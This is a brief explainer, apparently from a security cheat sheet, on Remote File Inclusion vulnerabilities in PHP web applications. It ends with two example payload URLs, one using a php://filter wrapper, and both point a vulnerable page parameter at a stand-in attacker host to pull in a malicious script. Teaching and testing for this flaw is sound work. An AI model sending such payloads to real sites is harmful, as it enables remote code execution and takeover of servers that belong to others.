## Remote File Inclusion (RFI)
- The Remote File Inclusion (RFI) vulnerability is a security flaw where an attacker can include remote 
files in a vulnerable web application. 
This can allow the attacker to execute malicious code on the web server and compromise the system.

- In an RFI attack, the attacker uses user input, such as a URL or form field, to include a remote file 
in the request. If the web application does not properly validate these inputs, it will process the 
request and return the content of the remote file to the attacker.

- An attacker can exploit this vulnerability to include malicious remote files containing harmful code, 
such as viruses or trojans, or to execute commands on the vulnerable server. In some cases, the attacker 
can direct the request to a PHP resource hosted on their own server, giving them a higher degree of control 
in the attack.

## Basic RFI attack:

```ruby
http://vulnerable-site.com/index.php?page=http://attacker-site.com/malicious-script.php
```

### RFI with PHP wrapper:
```ruby
http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=http://attacker-site.com/malicious-script.php
```